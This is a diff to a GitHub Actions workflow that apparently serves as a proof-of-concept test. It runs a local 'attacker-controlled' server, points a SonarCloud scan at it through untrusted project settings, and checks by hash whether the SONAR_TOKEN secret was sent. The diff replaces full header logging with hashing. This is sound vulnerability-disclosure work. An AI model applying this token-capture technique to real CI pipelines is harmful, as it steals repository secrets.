@@ -23,27 +23,22 @@ jobs:
           ref: ${{ github.event.workflow_run.head_branch }}
           fetch-depth: 0
 
-      - name: Show project settings the scanner will read
-        run: |
-          echo "WORKSPACE=$(pwd)"
-          cat sonar-project.properties
-
       - name: Start attacker-controlled log server
         run: |
           mkdir -p /tmp/sonar-test
           : > /tmp/sonar-test/requests.log
           cat > /tmp/sonar-test/srv.py <<'PY'
-          import json
+          import hashlib
           from http.server import BaseHTTPRequestHandler, HTTPServer
 
           class H(BaseHTTPRequestHandler):
               def log_message(self, *a):
                   pass
               def _handle(self):
+                  auth = self.headers.get('Authorization', '')
                   with open('/tmp/sonar-test/requests.log', 'a') as f:
                       f.write(f"{self.command} {self.path}\n")
-                      for k, v in self.headers.items():
-                          f.write(f"  {k}: {v}\n")
+                      f.write(f"  AUTH_LEN={len(auth)} AUTH_SHA256={hashlib.sha256(auth.encode()).hexdigest()}\n")
                       f.write("---\n")
                   if self.path.startswith('/api/server/version') or self.path.startswith('/api/v2/analysis/version'):
                       body = b'10.6.0.12345'
@@ -63,7 +58,6 @@ jobs:
           PY
           nohup python3 /tmp/sonar-test/srv.py > /tmp/sonar-test/srv.out 2>&1 &
           sleep 2
-          echo "server started"
 
       - name: Run SonarCloud scan with attacker-controlled project settings
         continue-on-error: true
@@ -74,6 +68,10 @@ jobs:
 
       - name: Show what the attacker-controlled host received
         if: always()
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
         run: |
           echo "===== CAPTURED REQUESTS ====="
           cat /tmp/sonar-test/requests.log
+          echo "===== EXPECTED ====="
+          echo "EXPECTED_AUTH_SHA256=$(printf 'Bearer %s' "$SONAR_TOKEN" | sha256sum | cut -d' ' -f1)"
